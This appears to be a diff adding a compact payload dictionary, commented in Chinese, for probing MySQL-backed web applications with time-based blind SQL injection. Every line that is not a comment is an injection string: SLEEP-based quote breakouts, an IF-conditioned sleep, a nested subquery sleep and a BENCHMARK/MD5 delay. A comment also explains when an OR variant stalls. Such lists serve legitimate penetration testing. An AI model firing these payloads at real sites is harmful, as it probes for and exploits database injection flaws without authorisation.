@@ -1,0 +1,8 @@
+# === 時間盲注 (Time-based) 精簡探測字典 ===
+# 測試目標: 觸發 MySQL 延遲 (預設 SLEEP 5 秒)
+1' AND SLEEP(5) #
+1" AND SLEEP(5) #
+# 1' OR SLEEP(5) # user_id 不等於1時，會執行 SLEEP(5)，會測很久:
+1' AND IF(1=1, SLEEP(5), 0) #
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) #
+1' AND BENCHMARK(5000000,MD5(1)) #
